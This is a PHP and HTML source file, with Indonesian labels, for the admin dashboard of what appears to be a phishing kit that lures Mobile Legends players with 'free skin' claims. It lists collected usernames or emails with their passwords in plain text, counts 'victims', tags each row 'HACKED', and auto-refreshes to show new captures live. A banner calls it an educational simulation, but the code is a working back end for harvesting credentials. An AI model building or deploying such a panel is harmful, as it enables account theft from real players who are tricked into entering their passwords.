<?php
// dashboard.php - Menampilkan data yang terkumpul (untuk edukasi)
error_reporting(E_ALL);
ini_set('display_errors', 1);

// Koneksi database
$host = "localhost";
$user = "mlbb";
$pass = "mlbb";
$db = "mlbb";

$conn = new mysqli($host, $user, $pass, $db);

if ($conn->connect_error) {
    die("Koneksi gagal: " . $conn->connect_error);
}

// Ambil semua data
$sql = "SELECT * FROM skin_claims ORDER BY created_at DESC";
$result = $conn->query($sql);
?>
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dashboard - Data Terkumpul (EDUKASI)</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body {
            background: #0a0a0a;
            color: #fff;
            font-family: 'Courier New', monospace;
        }
        .container {
            max-width: 1200px;
            margin: 50px auto;
            padding: 20px;
        }
        .warning-banner {
            background: #ff0000;
            color: #fff;
            padding: 20px;
            border-radius: 10px;
            text-align: center;
            margin-bottom: 30px;
            animation: blink 1s infinite;
        }
        @keyframes blink {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.7; }
        }
        .data-card {
            background: #1a1a1a;
            border: 1px solid #ff0000;
            border-radius: 10px;
            padding: 20px;
            margin-bottom: 20px;
        }
        .data-item {
            background: #2a2a2a;
            padding: 15px;
            border-radius: 5px;
            margin-bottom: 10px;
            border-left: 4px solid #ff0000;
        }
        .data-item:hover {
            background: #3a3a3a;
        }
        .label {
            color: #ff6b6b;
            font-weight: bold;
        }
        .value {
            color: #00ff00;
            word-break: break-all;
        }
        .danger-text {
            color: #ff0000;
            font-weight: bold;
        }
        .stats {
            background: #1a1a1a;
            padding: 20px;
            border-radius: 10px;
            margin-bottom: 20px;
            border: 1px solid #ff6b6b;
        }
        .stats-number {
            font-size: 36px;
            color: #ff0000;
            font-weight: bold;
        }
        .real-time {
            color: #ff6b6b;
            animation: blink 1s infinite;
        }
        table {
            color: #fff;
        }
        th {
            background: #333;
            color: #ff6b6b;
        }
        td {
            background: #1a1a1a;
        }
        .hacked-tag {
            background: #ff0000;
            color: #fff;
            padding: 2px 10px;
            border-radius: 20px;
            font-size: 12px;
            animation: blink 1s infinite;
        }
        .footer {
            margin-top: 40px;
            padding: 20px;
            background: #1a1a1a;
            border-radius: 10px;
            text-align: center;
            border: 2px solid #ff0000;
        }
        .plain-text-box {
            background: #000;
            padding: 20px;
            border-radius: 5px;
            color: #00ff00;
            font-family: monospace;
            max-height: 300px;
            overflow-y: auto;
            white-space: pre-wrap;
            word-wrap: break-word;
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- WARNING BANNER -->
        <div class="warning-banner">
            <h1>⚠️ DATA TELAH TERKUMPUL! ⚠️</h1>
            <h4>Ini adalah simulasi untuk menunjukkan betapa mudahnya data Anda dicuri!</h4>
            <p class="mt-3"><strong>JANGAN PERNAH memasukkan password asli Anda ke website mencurigakan!</strong></p>
        </div>

        <!-- STATISTIK -->
        <div class="stats row">
            <div class="col-md-4 text-center">
                <h4>Total Korban (Simulasi)</h4>
                <div class="stats-number"><?= $result->num_rows ?></div>
                <small class="text-muted">Orang telah memasukkan data</small>
            </div>
            <div class="col-md-4 text-center">
                <h4>Data Terakhir</h4>
                <div class="stats-number real-time">LIVE</div>
                <small class="text-muted">Update real-time</small>
            </div>
            <div class="col-md-4 text-center">
                <h4>Status</h4>
                <div class="stats-number" style="color: #ff0000;">TEREXPOS!</div>
                <small class="text-muted">Data bisa diakses siapa saja</small>
            </div>
        </div>
        <!-- Data Table -->
        <div class="data-card">
            <h3 class="text-danger mb-3">
                📋 Data yang Berhasil Dikumpulkan
                <span class="hacked-tag">HACKED</span>
            </h3>
            
            <div class="table-responsive">
                <table class="table table-dark table-hover">
                    <thead>
                        <tr>
                            <th>#</th>
                            <th>Username/Email</th>
                            <th>Password</th>
                            <th>Skin yang Diklaim</th>
                            <th>Waktu</th>
                            <th>Status</th>
                        </tr>
                    </thead>
                    <tbody>
                        <?php 
                        if ($result->num_rows > 0) {
                            $no = 1;
                            while($row = $result->fetch_assoc()) {
                                // Highlight password
                                $password = htmlspecialchars($row['player_id']);
                                $masked = substr($password, 0, 2) . str_repeat('*', max(0, strlen($password) - 4)) . substr($password, -2);
                                
                                // Tampilkan data
                                echo "<tr>";
                                echo "<td>" . $no++ . "</td>";
                                echo "<td><span class='value'>" . htmlspecialchars($row['nama']) . "</span></td>";
                                echo "<td>";
                                echo "<span class='value' style='color:#ff6b6b;'>" . $password . "</span>";
                                echo "<br><small class='text-muted'>(" . $masked . ")</small>";
                                echo "</td>";
                                echo "<td>" . htmlspecialchars($row['skin']) . "</td>";
                                echo "<td>" . date('d/m/Y H:i:s', strtotime($row['created_at'])) . "</td>";
                                echo "<td><span class='badge bg-danger'>TEREXPOS!</span></td>";
                                echo "</tr>";
                            }
                        } else {
                            echo "<tr><td colspan='6' class='text-center text-muted'>Belum ada data</td></tr>";
                        }
                        ?>
                    </tbody>
                </table>
            </div>
         
        </div>

 
    <script>
    function clearData() {
        if(confirm('⚠️ Yakin ingin menghapus semua data? Ini hanya untuk demo edukasi!')) {
            window.location.href = 'clear_data.php';
        }
    }

    // Auto refresh setiap 10 detik
    setTimeout(function() {
        location.reload();
    }, 10000);
    </script>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>
<?php
$conn->close();
?>